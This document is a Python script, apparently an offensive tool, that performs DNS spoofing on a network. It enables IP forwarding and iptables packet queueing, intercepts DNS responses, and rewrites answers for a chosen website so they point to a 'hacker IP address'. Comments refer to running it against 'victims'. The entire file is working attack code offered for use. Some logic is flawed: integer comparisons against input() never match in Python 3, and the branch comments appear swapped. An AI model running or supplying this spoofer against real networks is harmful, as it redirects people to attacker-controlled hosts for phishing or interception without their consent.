#!/usr/bin/python
import scapy.all as scapy
import netfilterqueue
import subprocess
import argparse



def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--website", dest="website", help="Website url")
    parser.add_argument("-i", "--ip-address", dest="ip", help="Hacker IP address")
    option = parser.parse_args()
    return option

def process_packet(packet):
    option = get_arguments()
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname= scapy_packet[scapy.DNSQR].qname
        if option.website in qname:
            print("[+] spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=option.ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(str(scapy_packet))


    """to forward packets to the router"""
    packet.accept()
if __name__ == "__main__":
    try:
        subprocess.call(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True)

        answr = input("enter 1 to run on local 0 to run on the network  => ")
        if answr == 1:
            subprocess.call(["iptables -I OUTPUT -j NFQUEUE --queue-num 0"], shell=True)
            subprocess.call(["iptables -I INPUT -j NFQUEUE --queue-num 0"], shell=True)
        elif answr == 0:
            """to use on local machine not on the victims"""
            subprocess.call(["iptables -I FORWARD -j NFQUEUE --queue-num 0"], shell=True)
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        subprocess.call(["iptables --flush"], shell=True)
        print("\n  [+] Dtected Ctrl+C -------> Quitting.")
